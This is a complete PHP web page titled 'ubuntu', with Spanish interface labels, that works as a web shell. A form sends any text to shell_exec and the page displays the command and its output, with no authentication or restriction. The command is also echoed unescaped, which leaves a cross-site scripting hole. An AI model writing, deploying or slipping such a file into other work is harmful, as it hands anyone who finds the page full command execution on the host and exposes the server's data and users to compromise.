<!DOCTYPE html>
<html>

<head>
    <title>ubuntu</title>
    <style>
        .container {
            border: 1px solid #ccc;
            padding: 10px;
            margin-bottom: 10px;
        }
    </style>
</head>

<body>
    <h1>ubuntu</h1>
    <?php
    $command = "";

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST["command"];
        $output = shell_exec($command);
    }
    ?>
    <div class="container">
        <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
            <input type="text" name="command" placeholder="Escribe tu comando">
            <button type="submit">Ejecutar</button>
        </form>
    </div>

    <div class="container">
        <strong>Entrada:</strong>
        <?php echo $command; ?>
    </div>

    <div class="container">
        <strong>Salida:</strong>
        <?php echo $output; ?>
    </div>

</body>

</html>